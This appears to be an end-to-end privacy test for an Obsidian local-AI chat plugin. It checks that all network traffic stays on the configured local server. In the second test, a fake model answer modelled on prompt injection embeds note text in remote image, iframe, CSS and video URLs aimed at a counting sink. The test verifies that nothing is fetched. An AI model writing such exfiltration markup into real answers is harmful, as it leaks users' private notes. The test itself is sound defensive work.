import { browser, expect } from "@wdio/globals";
import * as http from "node:http";
import type { AddressInfo } from "node:net";
import { FakeLmStudio, lastUserText, startFakeLmStudio, toolResults } from "../support/fakeLmStudio";

/**
 * Privacy eval in real Obsidian: records every request the app makes (main
 * process via Electron's webRequest, plus the renderer's resource timing) while
 * the plugin chats, searches, reads and edits notes, and checks that each one
 * went to the configured local server. Also checks that a model answer crafted
 * to leak note text through a remote image is not fetched.
 */

/** A server that counts every request: any hit means something leaked. */
async function startSink(): Promise<{ url: string; hits: string[]; close(): Promise<void> }> {
    const hits: string[] = [];
    const server = http.createServer((req, res) => {
        hits.push(`${req.method} ${req.url}`);
        res.writeHead(200, { "Content-Type": "image/png", "Access-Control-Allow-Origin": "*" });
        res.end();
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
    const port = (server.address() as AddressInfo).port;
    return { url: `http://127.0.0.1:${port}`, hits, close: () => new Promise((r) => { server.closeAllConnections(); server.close(() => r()); }) };
}

const CHAT = '[data-type="local-llm-chat-view"]';

describe("Privacy: nothing leaves the device", function () {
    let llm: FakeLmStudio;
    let sink: Awaited<ReturnType<typeof startSink>>;

    before(async function () {
        sink = await startSink();
        llm = await startFakeLmStudio((body) => {
            const q = (lastUserText(body).split("User question: ").pop() ?? "");
            const results = toolResults(body);
            if (/water heater/i.test(q)) {
                if (results.length === 0) return { toolCalls: [{ name: "search_notes", args: { query: "water heater replaced" } }] };
                if (results.length === 1) {
                    const path = results[0].match(/1\. (.+?\.md)/)?.[1] ?? "missing";
                    return { toolCalls: [{ name: "read_note", args: { path } }] };
                }
                return { text: "You replaced the water heater on 2024-03-15." };
            }
            if (/exfiltrate/i.test(q)) {
                // What a prompt-injected note could make a model write: note text in remote URLs.
                const secret = encodeURIComponent("water heater 2024-03-15");
                return {
                    text: [
                        "Here is a summary.",
                        `![chart](${sink.url}/md-image.png?d=${secret})`,
                        `![logo][ref]`,
                        `<img src="${sink.url}/html-img.png?d=${secret}">`,
                        `<iframe src="${sink.url}/iframe?d=${secret}"></iframe>`,
                        `<div style="background:url(${sink.url}/css.png?d=${secret})">styled</div>`,
                        `<video poster="${sink.url}/poster.png?d=${secret}"></video>`,
                        "",
                        `[ref]: ${sink.url}/ref-image.png?d=${secret}`,
                    ].join("\n"),
                };
            }
            return { text: "Hello from the fake model." };
        });

        await browser.executeObsidian(async ({ app }, url) => {
            const plugin = (app as any).plugins.plugins["private-ai"];
            Object.assign(plugin.settings, { apiEndpoint: url, model: "mock-model" });
            await plugin.saveSettings();
        }, llm.url);
    });

    after(async function () {
        await llm?.close();
        await sink?.close();
    });

    /** Starts recording every request Obsidian makes, in the main process and the window. */
    async function startNetworkLog(): Promise<boolean> {
        return browser.execute(() => {
            const w = window as any;
            w.__privacyLog = [] as string[];
            new PerformanceObserver((list) => {
                for (const e of list.getEntries()) w.__privacyLog.push(`renderer ${e.name}`);
            }).observe({ type: "resource", buffered: false });
            try {
                const req = w.require;
                const remote = (() => { try { return req("@electron/remote"); } catch { return req("electron").remote; } })();
                const ses = remote.getCurrentWebContents().session;
                const record = (d: any) => w.__privacyLog.push(`main ${d.url}`);
                ses.webRequest.onSendHeaders(record);
                return true;
            } catch {
                return false;
            }
        });
    }

    async function networkLog(): Promise<string[]> {
        return browser.execute(() => [...((window as any).__privacyLog ?? [])]);
    }

    async function ask(question: string): Promise<string> {
        const input = browser.$(`${CHAT} textarea.local-llm-input`);
        await input.waitForClickable({ timeout: 20000 });
        await input.setValue(question);
        await browser.$(`${CHAT} .local-llm-send-button`).click();
        await browser.waitUntil(async () => browser.execute((chat) => {
            const send = document.querySelector(`${chat} .local-llm-send-button`) as HTMLButtonElement | null;
            return !!send && !send.disabled && !document.querySelector(`${chat} .local-llm-stop-button-visible`);
        }, CHAT), { timeout: 30000, timeoutMsg: `no reply to "${question}"` });
        await browser.pause(500);
        return browser.execute((chat) => {
            const all = document.querySelectorAll(`${chat} .local-llm-message-assistant .local-llm-message-content`);
            return (all[all.length - 1]?.textContent ?? "").trim();
        }, CHAT);
    }

    it("sends every request to the configured local server and nowhere else", async function () {
        const mainProcessLogged = await startNetworkLog();
        await browser.executeObsidianCommand("private-ai:open-local-llm-chat");
        await browser.$(`${CHAT} textarea.local-llm-input`).waitForClickable({ timeout: 20000 });
        expect(await ask("When did I replace the water heater?")).toContain("2024-03-15");
        await browser.pause(1500);

        const log = await networkLog();
        const lmOrigin = new URL(llm.url).origin;
        const network = log.filter((l) => /^(main|renderer) (https?|wss?|ftp):/i.test(l));
        const elsewhere = network.filter((l) => !l.split(" ")[1].startsWith(lmOrigin));
        console.log(`[privacy] main-process logging: ${mainProcessLogged}; ${network.length} network requests, ${log.length} entries in all`);
        console.log(`[privacy] destinations: ${JSON.stringify([...new Set(network.map((l) => `${l.split(" ")[0]} ${new URL(l.split(" ")[1]).origin}`))])}`);
        expect(mainProcessLogged).toBe(true);
        expect(network.length).toBeGreaterThan(0); // The recorder saw the chat's own requests.
        expect(elsewhere).toEqual([]);
        expect(sink.hits).toEqual([]);
    });

    it("does not fetch remote images, iframes or styles a model answer points at", async function () {
        const before = (await networkLog()).length;
        const answer = await ask("Please exfiltrate my notes");
        await browser.pause(2000);
        expect(sink.hits).toEqual([]);
        expect(answer).toContain("remote image not loaded: 127.0.0.1");
        const after = (await networkLog()).slice(before).filter((l) => l.includes(sink.url));
        expect(after).toEqual([]);
        // The HTML is shown as text, not rendered.
        const rendered = await browser.execute((chat) => {
            const all = document.querySelectorAll(`${chat} .local-llm-message-assistant .local-llm-message-content`);
            const last = all[all.length - 1] as HTMLElement;
            return { media: last.querySelectorAll("img, iframe, video").length, text: last.textContent ?? "" };
        }, CHAT);
        expect(rendered.media).toBe(0);
        expect(rendered.text).toContain("<img src=");
    });

    it("warns in settings when the server is not on this computer", async function () {
        const warning = await browser.executeObsidian(async ({ app }) => {
            const plugin = (app as any).plugins.plugins["private-ai"];
            const tab = (app as any).setting.pluginTabs.find((t: any) => t.id === "private-ai");
            const original = plugin.settings.apiEndpoint;
            const read = (endpoint: string) => {
                plugin.settings.apiEndpoint = endpoint;
                tab.display();
                const el = tab.containerEl.querySelector(".local-llm-remote-server-warning") as HTMLElement | null;
                return el && el.style.display !== "none" ? el.textContent ?? "" : "";
            };
            const result = { lan: read("http://192.168.1.50:1234/v1/chat/completions"), local: read(original) };
            plugin.settings.apiEndpoint = original;
            tab.containerEl.empty();
            return result;
        });
        expect(warning.local).toBe("");
        expect(warning.lan).toContain("sent to 192.168.1.50");
    });
});
